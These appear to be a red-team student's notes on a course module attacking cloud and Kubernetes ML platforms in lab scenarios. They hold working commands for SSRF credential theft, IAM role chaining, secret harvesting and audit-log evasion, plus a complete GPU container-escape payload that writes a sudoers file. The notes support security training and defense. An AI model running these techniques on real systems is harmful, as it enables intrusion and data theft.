Module 9 — AI Infrastructure and Deployment Exploits

Fuente: material del curso correspondiente (sin video público)

Objective

Attack where models run rather than what gets deployed: cloud ML platforms (SageMaker, S3, SSM, Secrets Manager, CloudWatch, ECR, EC2) and Kubernetes-based ML serving (RBAC, service account tokens, multi-container pods, GPU hosts). Two engagements: (1) an SSRF in a hospital patient-portal Lambda chained through IAM role assumptions into model registries, training data, and production secrets; (2) a spearphished engineer's kubeconfig escalated through service account tokens, container escape on GPU hosts, and cross-namespace pivoting. A capstone combines both into one AWS→Kubernetes→AWS engagement.

Course framing worth keeping: cloud AI security = the shared responsibility model — only the customer's slice (data, access controls, configuration) is in scope for assessment; and AI infrastructure inherits every cloud/container weakness, then adds new ones because ML pipelines demand broad permissions, shared compute, and fast iteration.

Target surface

Engagement 1 — Megacorp One AI / St. Hubbins Hospital (AWS, single account): API Gateway → Lambda patient portal (/api/export with SSRF), SageMaker endpoint sthubbins-pea-endpoint, S3 buckets megacorpone-sthubbins-sagemaker-*, DynamoDB sthubbins-pea-feedback, plus a second, unscoped project in the same account (Rainy Day Financial: megacorpone-rainyday-sagemaker-*, an internet-exposed vLLM host). IAM chain: pea-portal-lambda-role → DataScientistRole → MLOpsRole → SageMakerExecutionRole.

Engagement 2 — Ridgeline Autonomous (Kubernetes ML platform): namespaces app, ml-inference, pipeline-system, monitoring, ci-cd, data-engineering, ml-inference-staging, etc. Workloads: KServe/Kubeflow inference (inference-pod, SA inference-sa), a 4-container model-pipeline pod (init model-loader + pre-processor/inference/post-processor/log-collector sidecars sharing a request-queue volume), MinIO artifact store, MLflow + Postgres, Argo Workflows. Foothold: SSH on a platform engineer's workstation with ~/.kube/config (client-cert auth, CN=aisha-kone, O=megacorpone:av-platform-ops, API server cp-01:6443, default ns app). GPU host scenario: robertj with sudo rights to gpu-build.sh/gpu-run.sh wrappers, NVIDIA Container Toolkit 1.17.7 + runc 1.2.6.

Techniques

1. SSRF → Lambda credentials → IAM role chain (cloud)

  1. SSRF to read the Lambda's own environment via file://:
curl -s "https://APIGATEWAY_URL/prod/api/export?template_url=file:///proc/self/environ" \
  | jq -r '.report' | tr '\0' '\n' \
  | grep -E '^(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN|BACKEND_ROLE_ARN|SAGEMAKER_ENDPOINT)='

The dump yields temporary credentials plus reconnaissance gold: SAGEMAKER_ENDPOINT, REPORT_TEMPLATE_URL (an S3 bucket name), DYNAMODB_TABLE, and BACKEND_ROLE_ARN (DataScientistRole — appears either because the Lambda assumes it (sts:AssumeRole) or passes it (iam:PassRole); both are lateral-movement leads).

  1. Validate quietly. aws sts get-caller-identity is infallible (works even under explicit deny, needs no permission) but is loud in CloudTrail. If the creds came from a running Lambda, skip it — or call an endpoint you expect to succeed and infer identity from the response/error.
  2. Assume the role with a session name that blends into the environment (the session name lands in the ARN and CloudTrail):
aws sts assume-role --role-arn arn:aws:iam::533267328750:role/DataScientistRole --role-session-name "lambda-pea"
  1. Read the inline policy (attached-policy listing was denied; inline listing allowed) and analyze it:
aws iam list-role-policies --role-name DataScientistRole          # -> DataScientistPolicy
aws iam get-role-policy --role-name DataScientistRole --policy-name DataScientistPolicy

Most statements are ABAC-scoped (aws:ResourceTag/Project=sthubbins-pea, aws:RequestTag/Project=sthubbins-pea) — but sagemaker:List* cannot be tag-scoped, so account-wide enumeration is free. Two escalation statements: PassRoleToSageMaker (self-referential, useless) and AssumeMLOpsRole. IAMRoles grants iam:ListRoles/GetRolePolicy — map the ML role landscape:

aws iam list-roles --query 'Roles[?starts_with(RoleName, `DataScientist`) || starts_with(RoleName, `MLOps`) || starts_with(RoleName, `SageMaker`) || starts_with(RoleName, `RainyDay`)].RoleName'
# -> DataScientistRole, MLOpsRole, RainyDayDataScientistRole, RainyDayVLLMRole, SageMakerExecutionRole
  1. Check the next hop's trust policy — a Principal: root reference means any principal in the account can assume it if its own policy allows:
aws sts assume-role --role-arn arn:aws:iam::533267328750:role/MLOpsRole --role-session-name "pea-deploy"

MLOpsRole adds notebook lifecycle management (Create/Start/Update/DeleteNotebookInstance, CreatePresignedNotebookInstanceUrl), iam:PassRole on role/SageMaker*, S3 read on megacorpone-sthubbins-sagemaker-*, CloudWatch log read, and sts:AssumeRole → SageMakerExecutionRole. (Note: CreateNotebookInstance + PassRole role/SageMaker* alone reproduce that final hop even without the explicit assume statement.)

  1. Final hop and account-wide breakout. SageMakerExecutionRole carries the AWS-managed AmazonSageMakerFullAccess (sagemaker:* plus broad S3/ECR/CloudWatch/EC2/Lambda) plus an inline extra: ssm:GetParameter*/DescribeParameters on *, DynamoDB ListTables/DescribeTable/Scan/GetItem/Query on *, apigateway:GET on *. The managed policy's S3 wildcard obliterates project boundaries:
aws sts assume-role --role-arn arn:aws:iam::533267328750:role/SageMakerExecutionRole --role-session-name "training-run"
aws s3 ls    # now lists buckets from *other projects*, e.g. megacorpone-rainyday-sagemaker-*

Scope discipline (course-highlighted, keep it in ares engagements): discovering resources outside the RoE is itself the finding — document cross-project visibility, stop, and get written scope expansion from the engagement lead before touching other clients' resources. Here the Rainy Day assets were authorized as in-scope, and testing proceeds.

2. Secrets & credential leakage — five services, five leak vectors

With account-wide read, hunt for unsecured credentials:

  • S3 (aws s3 ls s3://bucket/ --recursive): standard ML layout (models/, data/, experiments/, notebooks/, .mlflow/); patient_feedback.csv = PHI. Check s3api list-object-versions — deleted .env/config files survive versioning. --recursive generates noisy ListObjectsV2 events; targeted GetObject calls mimic normal app behavior.
  • Secrets Manager (aws secretsmanager list-secrets): found a Jenkins deploy token — but GetSecretValue on it is denied because AmazonSageMakerFullAccess scopes secret reads to secret:AmazonSageMaker-* ARNs or the tag SageMaker=true. Know the policy before you touch — avoids AccessDenied alerts. Document for later.
  • SSM Parameter Store (aws ssm describe-parameters): four parameters, all String (plaintext, no KMS) across two project namespaces. Retrieve with get-parameters-by-path --path "/megacorpone/sthubbins/prod/" --recursive --with-decryption → a PostgreSQL connection string with an embedded password. --recursive stands out in CloudTrail (pipelines read parameters individually) — prefer DescribeParameters to map, then individual GetParameter calls. Check history — rotation leaves the old value readable (aws ssm get-parameter-history --name ... --with-decryption), and old passwords get reused elsewhere.
  • CloudWatch Logs (aws logs describe-log-groups): training-job log groups keep DEBUG-level output forever. One stream leaks an LLM API key and a model-registry bearer token; a failed run leaks a database URL and AWS credentials in the retry handler — failed jobs are never reviewed, so creds persist indefinitely. Surgical hunting beats stream dumps: logs:FilterLogEvents --filter-pattern "password OR key OR secret OR token".
  • Model Registry + ECR: describe-model-package exposes container Environment (a plaintext registry token) and CustomerMetadataProperties that cross-reference the training job, S3 data path, execution role ARN, and ECR image — one call maps the whole pipeline. Pull the referenced training image and read baked-in secrets:
aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 533267328750.dkr.ecr.us-east-1.amazonaws.com
docker pull 533267328750.dkr.ecr.us-east-1.amazonaws.com/megacorpone-sthubbins-training:latest
docker inspect --format '{{json .Config.Env}}' 533267328750.dkr.ecr.us-east-1.amazonaws.com/megacorpone-sthubbins-training:latest | jq -r '.[]'
# -> DATABASE_URL (with password), FEATURE_STORE_API_KEY, AWS_ACCESS_KEY_ID/SECRET baked in at build time

(docker inspect misses image files — a config file with a HuggingFace token survived inside the image; extract layers for the full picture.)

Common thread: ML workflows scatter artifacts across services with no centralized secret management — each service is another hiding place.

3. Exposed endpoints and data stores

Unauthenticated internet exposure is the highest-impact class — no credentials needed:

aws ec2 describe-instances --filters "Name=instance-state-name,Values=running" \
  --query 'Reservations[*].Instances[*].{ID:InstanceId,Type:InstanceType,PublicIP:PublicIpAddress,SG:SecurityGroups[0].GroupName,Project:Tags[?Key==`Project`]|[0].Value,Client:Tags[?Key==`Client`]|[0].Value,Name:Tags[?Key==`Name`]|[0].Value}'

Tag-based filters narrow the CloudTrail footprint vs an unfiltered dump. Result: a g4dn.xlarge GPU host tagged to the other client project — unscoped ec2:Describe* again crossing boundaries. Its SG: 22 open to 0.0.0.0/0, 8000 (vLLM) open to 0.0.0.0/0, 8080 (wrapper API) VPC-only. Model servers rarely auth by default:

curl -s http://54.210.123.45:8000/v1/models | jq   # model metadata, no auth
curl -s http://54.210.123.45:8000/version | jq     # vLLM 0.12.0 -> targeted CVE research

Impact: free inference (cost abuse), model extraction, and reverse-engineering of a fintech lender's scoring criteria.

4. Kubernetes RBAC misconfigurations — kubeconfig to cluster-wide secret read

  1. On the compromised workstation, kubectl config view --raw reads the kubeconfig without generating API audit logs. Parse the client cert for identity context — CN = username, O = groups (watch for system:masters):
kubectl config view --raw -o jsonpath='{.users[0].user.client-certificate-data}' \
  | base64 -d | openssl x509 -text -noout | grep Subject
  1. Mine ~/.bash_history first: it reveals the two namespaces the engineer works in (app, ml-inference), her kubectl exec habits, SSH to the control-plane node, secret/ConfigMap names, and notes files. Matching her established command patterns makes your audit-log entries indistinguishable from hers.
  2. ConfigMaps before secrets: app-config and pipeline-config yield the full backend topology — cluster-local DNS names, MinIO at minio.pipeline-system.svc:9000, artifact bucket megacorpone-ridgeline-artifacts, MLflow tracking URI and experiment name, model path.
  3. Baseline your identity: kubectl auth can-i --list -n ml-inference (normal troubleshooting command, rarely alerted on) → pods list/exec/log, configmaps/services get/list — properly scoped, no secrets.
  4. Exec into inference-pod (the pod she already execs into; single-container, core workload — more likely to have a privileged SA than infrastructure pods). Read the auto-mounted token (default automountServiceAccountToken: true mounts it at /var/run/secrets/kubernetes.io/serviceaccount/):
  5. Production images lack kubectl — use the API directly with the env-provided server address and the mounted CA:
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export APISERVER=https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}
curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" \
  ${APISERVER}/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"ml-inference"}}' \
  | jq '.status.resourceRules[] | select(.resources != null) | {verbs, resources, apiGroups}'

inference-sa far exceeds Aisha's own role: secrets get/list/watch, namespaces/pods/services/configmaps/nodes (cluster-scoped resources in the rule set — suspicious for a workload identity), pods/exec, serviceaccounts, and full RBAC read.

  1. Prove the scope: repeat the identical SelfSubjectRulesReview with "namespace":"monitoring" — identical rules confirm a ClusterRoleBinding, i.e. secret read in every namespace.
  2. Enumerate and drain:
curl -s ... ${APISERVER}/api/v1/namespaces | jq -r '.items[].metadata.name'
curl -s ... ${APISERVER}/api/v1/namespaces/pipeline-system/secrets | jq -r '.items[] | "\(.metadata.name) \(.type)"'
# -> minio-credentials, mlflow-tracking-credentials, postgres-credentials, argo-controller-token, backup-encryption-key
  1. The prize: argo-controller-token is a pre-v1.24-style long-lived SA-token secret (ca.crt/namespace/token). Decode the JWT payload to identify it (system:serviceaccount:pipeline-system:argo-workflow-controller), then review its rules — create/delete/patch on pods, * on workflows/workflowtemplates/cronworkflows, daemonsets, cronjobs/jobs, PVCs.

Root cause: the ml-inference-role ClusterRole's stated intent ("read secrets for dashboard auth, enumerate pods for health checks") vs implementation — cluster-wide secrets, exec into any pod, RBAC enumeration. Intent-vs-implementation gap is the exploitable surface.

5. Identity chaining and ML-data-store compromise

Neither stolen identity suffices alone — the pattern is read-then-write:

Capability inference-sa argo-workflow-controller
Read secrets (all namespaces) ✔ ✔
List namespaces/pods/nodes, enumerate RBAC ✔ ✘
Exec into pods ✔ ✔
Create/delete pods ✘ ✔
DaemonSets/CronJobs, Argo workflows ✘ ✔

inference-sa sees everything but can't act; it can read the Argo token precisely because of the cluster-wide secret read. Exfiltrate the artifact store:

curl -s ... ${APISERVER}/api/v1/namespaces/pipeline-system/secrets/minio-credentials \
  | jq '{accesskey: (.data.accesskey | @base64d), secretkey: (.data.secretkey | @base64d)}'

MinIO holds model binaries and training data — with these credentials an attacker downloads models, injects poisoned ones, or plants backdoored artifacts picked up by the next training run. Combined with the KServe labels on the pod (serving.kserve.io/inferenceservice=incident-classifier) and the pipeline-config values, the attacker has the complete model-artifact map without ever reading the InferenceService CRD.

6. Abusing multi-container pods in ML pipelines

All containers in a pod share the network namespace and can share volumes. Inspect the 4-container model-pipeline pod (raw pod JSON via the API): init container model-loader populates /models; pre-processor, inference, and post-processor all mount the request-queue volume read-write; inference alone mounts a credentials secret at /secrets.

With pods/exec on any pod in any namespace (from inference-sa), drop into the pre-processor sidecar and read live traffic:

kubectl exec -it model-pipeline -c pre-processor -n ml-inference -- /bin/sh
ls /queue/requests/
cat /queue/requests/req_test-001.json

Every safety-incident report flows through this queue as tokenized data. From one sidecar an attacker can: exfiltrate all incoming requests; modify requests before inference reads them (e.g. replace "critical" keywords with "routine" to force misclassification of AV safety reports); inject fake requests to probe model behavior; write to the shared log volume to cover tracks or forge audit entries. ATLAS mapping: poisoning the container image supply chain here is AML.T0010.004 (AI Supply Chain Compromise: Container Registry).

7. Container security on GPU hosts — NVIDIA Container Toolkit escape (CVE-2025-23266)

Background: cgroups v2 has no GPU controller — GPU isolation is entirely userspace (NVIDIA Container Toolkit hooks), so toolkit vulnerabilities bypass container boundaries. Hardware fixes (NVIDIA MIG on A100+, AMD MI300X chiplets, Intel SR-IOV) don't exist on the still-common Turing/Volta fleet.

Foothold: robertj, no docker group, but sudo -l shows NOPASSWD on the sanctioned wrappers. gpu-run.sh blocks --privileged, --pid, --net=host, --cap-add, -v/--volume/--mount, --security-opt — then runs docker run --rm --runtime=nvidia --gpus=all "$@". The filter checks runtime flags; it cannot check what a Dockerfile's ENV sets.

Fingerprint the stack and match against advisories:

dpkg-query -W nvidia-container-toolkit    # 1.17.7-1
runc --version                            # 1.2.6
grep cuda-compat-mode /etc/nvidia-container-runtime/config.toml   # "hook"

CVE-2025-23266 chains: (1) runc copies container environment variables into its own process before spawning OCI hooks; (2) the toolkit's CUDA-compat hook inherits that polluted environment instead of starting clean → attacker-controlled LD_PRELOAD executes in the hook on the host as root, before the container even starts. The wrapper's checks never run in time.

Payload — constructor library that unsets LD_PRELOAD (avoid recursion) and plants a sudoers drop-in named to blend with CUDA components:

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>

#define SUDOERS "/etc/sudoers.d/cuda-compat-update"

__attribute__((constructor))
static void init(void) {
    unsetenv("LD_PRELOAD");
    FILE *f = fopen(SUDOERS, "w");
    if (f) {
        fprintf(f, "robertj ALL=(ALL) NOPASSWD: ALL\n");
        fclose(f);
        chmod(SUDOERS, 0440);
    }
}

Build and detonate through the approved wrapper — image name cuda-compat-hotfix looks like routine maintenance:

gcc -shared -fPIC -nostartfiles -o /tmp/cuda-compat-build/cuda_compat_shim.so \
    /tmp/cuda-compat-build/cuda_compat_shim.c

FROM busybox
ENV LD_PRELOAD=/proc/self/cwd/cuda_compat_shim.so
ADD cuda_compat_shim.so /

/proc/self/cwd/ matters: when the hook runs, its cwd is the container's rootfs on the host, so the symlink resolves to the library even though it only exists inside the image.

sudo /opt/ridgeline/tools/gpu-build.sh -t cuda-compat-hotfix -f /tmp/cuda-compat-build/Dockerfile /tmp/cuda-compat-build/
sudo /opt/ridgeline/tools/gpu-run.sh cuda-compat-hotfix echo done
sudo -l   # -> (ALL) NOPASSWD: ALL   ->   sudo -i = root

8. Capstone — hybrid deployment (AWS ↔ Kubernetes)

UrbanPulse: AWS for training, on-prem K8s for serving. Foothold: SSH to an engineer workstation ([lab credential in course text]). Graded chain: (1) expand execution context — interact with the K8s API as a different identity than initial access; (2) use the new context to cross namespace boundaries and retrieve credentials for external cloud services; (3) escalate in AWS by assuming a more powerful identity; (4) exfiltrate the platform PostgreSQL to an attacker-controlled pulseml-exfil-[suffix] bucket as dump.csv (content integrity graded). Extra mile: root on a worker node (/root/proof.txt on worker-platform) by abusing cluster execution privileges — i.e. the §7 escape deployed from inside the cluster.

Detection & defense

  • IAM: resource-scope every policy — ARN patterns or ABAC tag conditions (but remember List* actions can't be tag-scoped, so enumeration is always free in shared accounts); never use Principal: root trust policies casually; avoid AmazonSageMakerFullAccess on execution roles (it breaks project boundaries account-wide); split projects into separate accounts. Monitor sts:AssumeRole chains and unusual role-session names.
  • Secrets: centralized secret management; never plaintext String SSM parameters or DEBUG logging in production training jobs; scrub failed-run logs (they're never reviewed); no credentials baked into container image ENV or registry metadata; check S3 versioning/SSM history when rotating.
  • Kubernetes: set automountServiceAccountToken: false on pods that don't need the API (inference servers, feature stores); where the API is needed, use projected tokens with short TTL and audience binding — and eliminate long-lived token Secrets (pre-1.24 style, like argo-controller-token); scope RBAC by intent — "read secrets for dashboard auth" must be a namespaced Role naming specific Secrets, never a ClusterRole on *; audit RoleBindings for workload SAs bound cluster-wide; the course's ml-inference-staging namespace implements exactly the controls that kill this chain (worth replicating: restricted pod specs, no cluster-wide bindings).
  • Pods: minimize shared read-write volumes across containers; treat every sidecar as a co-tenant with full access to shared volumes; gate pods/exec — it's the lateral-movement primitive throughout.
  • GPU hosts: patch NVIDIA Container Toolkit promptly (the hook-env class of CVEs); treat Dockerfile ENV as an exploit vector that flag-filtering wrappers cannot see; deploy MIG/hardware partitioning where silicon allows; wrapper scripts that blocklist dangerous flags are bypassable by design — constrain what can be built, not just how it runs.
  • Cloud logging: CloudTrail signals emphasized in the module — sts:GetCallerIdentity noise, ListObjectsV2 --recursive, GetParametersByPath --recursive (vs per-parameter reads), access-denied bursts from brute-force permission scanners (Pacu/ScoutSuite) — and conversely, the stealth patterns red teams should use.

Ares integration notes

  • Ares runs on Kubernetes itself — dual lens. Audit value: everything in §4–§6 (SelfSubjectRulesReview from inside a pod, cluster-wide secret read, long-lived token Secrets, over-broad ClusterRoleBindings, shared-volume sidecars) is directly reusable as checks when assessing a client's K8s ML platform — and ares' own deployment should be tested with the same checklist, because a compromised ares pod inherits whatever SA/RBAC it runs under. Self-exposure lessons: ares needs pod creation and multi-namespace access to do its job — precisely the "over-privileged automation" pattern the Argo controller exemplifies. Apply the module's mitigations to ares' own chart: bound short-TTL projected tokens, no token Secret mounts, intent-scoped RBAC, and namespace isolation between ares and the workloads it targets, so ares is not the pivot that hands an attacker the cluster.
  • pentest-attack-flow / ATLAS mapping: encode this module as an attack-flow graph — initial access (SSRF / phished kubeconfig) → credential access (Lambda env, SA token, Secret reads, CloudWatch/SSM/ECR harvesting) → privilege escalation (role chain; identity chaining inference-sa→argo; CVE-2025-23266 host escape) → collection (training data, model artifacts, MinIO, live inference traffic) → impact (model poisoning via artifact store, misclassification via sidecar, exfil). ATLAS technique nodes to tag: AML.T0010.004 (container registry compromise), AML.T0040 (ML model inference API access — the open vLLM endpoint), plus the cloud-native MITRE ATT&CK techniques the course implicitly walks (SSRF → credential dumping → valid accounts → container escape). The capstone is the reference flow for validating the chain end-to-end in ares.
  • Operational carryovers: prefer policy-knowledge-driven targeting over brute-force enumeration (avoid Pacu/ScoutSuite noise on red team engagements); pick assume-role session names and kubectl invocations that match the environment's existing patterns; verify scope in writing before touching cross-project resources (the Rainy Day discipline).
